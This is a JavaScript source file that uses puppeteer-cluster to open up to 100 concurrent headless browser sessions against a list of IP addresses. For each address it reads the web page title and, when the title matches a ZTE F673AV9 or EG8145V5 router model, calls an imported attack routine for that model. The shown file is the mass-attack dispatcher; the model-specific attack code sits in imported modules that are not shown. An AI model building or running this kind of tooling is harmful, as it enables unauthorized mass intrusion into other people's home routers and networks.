import {Cluster} from "puppeteer-cluster";
import attackZtePrincipal from "./modelos/modelo-F673AV9.js"
import attackEG8145V5 from "./modelos/modelo-EG8145V5.js"
import {ips} from "./ips.js";

(async () => {
    const cluster = await Cluster.launch({
        concurrency: Cluster.CONCURRENCY_CONTEXT,
        maxConcurrency: 100,
        monitor: true,
        puppeteerOptions: {
            ignoreHTTPSErrors: true
        }
    });

    await cluster.task(attack)
    cluster.on('taskerror', (err, data) => {});

    ips.forEach(ip => {
        cluster.queue(ip)
    });

    await cluster.idle();
    await cluster.close();
})();

async function attack({page, data: ip}) {
    const localpage = page;
    const endereco = `http://${ip}`;
    let title = "";

    {
        await localpage.setViewport({
            width: 764,
            height: 928
        })
    }
    {
        await localpage.goto(endereco);
        await localpage.waitForTimeout(2000);
        title = await page.title();
        console.log(title);
    }
    {
        if (title === "F673AV9") await attackZtePrincipal(page, endereco);
        if (title === "EG8145V5") await attackEG8145V5(page, endereco);
    }
}


